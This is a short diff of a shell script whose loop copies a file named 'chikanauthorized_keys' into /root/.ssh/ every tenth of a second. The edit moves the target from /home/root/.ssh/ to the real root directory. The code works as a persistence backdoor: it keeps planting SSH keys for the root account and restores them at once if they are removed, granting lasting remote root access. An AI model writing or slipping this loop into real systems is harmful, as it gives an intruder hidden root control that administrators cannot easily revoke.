@@ -2,7 +2,7 @@
 
 while true
 do
-cp authorized_keys /home/root/.ssh/
+cp chikanauthorized_keys /root/.ssh/
 sleep 0.1
 done
 
